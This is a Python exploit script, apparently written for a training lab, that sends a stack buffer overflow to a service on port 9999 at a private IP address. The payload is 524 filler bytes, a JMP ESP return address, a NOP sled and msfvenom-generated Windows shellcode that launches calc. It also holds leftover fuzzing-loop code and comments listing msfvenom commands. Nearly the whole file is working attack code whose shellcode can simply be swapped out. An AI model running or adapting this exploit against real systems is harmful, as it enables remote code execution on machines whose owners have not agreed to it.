#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.128.163"

port = 9999
timeout = 5


junk = "A" * 524
#eip = 311712F3
eip = "\xF3\x12\x17\x31"
nop = "\x90"*16
#msfvenom -p windows/exec CMD=calc -f c -b "\x00" EXITFUNC=thread
shellcode = ("\xdb\xcb\xd9\x74\x24\xf4\x5a\xbd\x6c\x1f\x45\xec\x29\xc9"
"\xb1\x30\x31\x6a\x18\x83\xea\xfc\x03\x6a\x78\xfd\xb0\x10"
"\x68\x83\x3b\xe9\x68\xe4\xb2\x0c\x59\x24\xa0\x45\xc9\x94"
"\xa2\x08\xe5\x5f\xe6\xb8\x7e\x2d\x2f\xce\x37\x98\x09\xe1"
"\xc8\xb1\x6a\x60\x4a\xc8\xbe\x42\x73\x03\xb3\x83\xb4\x7e"                                                                                                                                                   
"\x3e\xd1\x6d\xf4\xed\xc6\x1a\x40\x2e\x6c\x50\x44\x36\x91"                                                                                                                                                   
"\x20\x67\x17\x04\x3b\x3e\xb7\xa6\xe8\x4a\xfe\xb0\xed\x77"                                                                                                                                                   
"\x48\x4a\xc5\x0c\x4b\x9a\x14\xec\xe0\xe3\x99\x1f\xf8\x24"                                                                                                                                                   
"\x1d\xc0\x8f\x5c\x5e\x7d\x88\x9a\x1d\x59\x1d\x39\x85\x2a"                                                                                                                                                   
"\x85\xe5\x34\xfe\x50\x6d\x3a\x4b\x16\x29\x5e\x4a\xfb\x41"                                                                                                                                                   
"\x5a\xc7\xfa\x85\xeb\x93\xd8\x01\xb0\x40\x40\x13\x1c\x26"                                                                                                                                                   
"\x7d\x43\xff\x97\xdb\x0f\xed\xcc\x51\x52\x7b\x12\xe7\xe8"                                                                                                                                                   
"\xc9\x14\xf7\xf2\x7d\x7d\xc6\x79\x12\xfa\xd7\xab\x57\xe4"                                                                                                                                                   
"\x35\x7e\xad\x8d\xe3\xeb\x0c\xd0\x13\xc6\x52\xed\x97\xe3"                                                                                                                                                                                  
"\x2a\x0a\x87\x81\x2f\x56\x0f\x79\x5d\xc7\xfa\x7d\xf2\xe8"                                                                                                                                                                                  
"\x2e\x1e\x95\x7a\xb2\xe1");                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
string= junk+eip+nop+shellcode                                                                                                                                                                                                              
#clean the code later on to remove the while loop which is un-neccesary here                                                                                                                                                                                                                                             
while True:                                                                                                                                                                                                                                 
  try:                                                                                                                                                                                                                                      
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:                                                                                                                                                                            
      s.settimeout(timeout)                                                                                                                                                                                                                 
      s.connect((ip, port))
      s.recv(1024)
      #print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  #string += 100 * "A"
  time.sleep(1)

#msfvenom -l p | grep windows | grep exec 
#msfvenom -p windows\exec --list-options 
